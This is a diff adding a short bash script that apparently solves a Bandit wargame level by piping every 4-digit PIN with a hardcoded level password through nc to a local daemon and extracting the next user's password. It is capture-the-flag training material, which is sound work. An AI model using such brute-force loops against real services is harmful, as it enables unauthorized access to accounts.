@@ -1,0 +1,13 @@
+#!/bin/bash            
+                       
+pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+                       
+output=$(mktemp)       
+echo $output           
+                       
+for i in {0000..9999}; do echo "$pass $i"; done | nc localhost 30002 > $output 2>&1
+#sleep 0.05 
+
+passcode=$(( `grep -n 'Correct' $output | cut -d : -f 1` - 1 ))
+echo "The passcode for the daemon is $passcode"
+grep 'password of user bandit25' $output
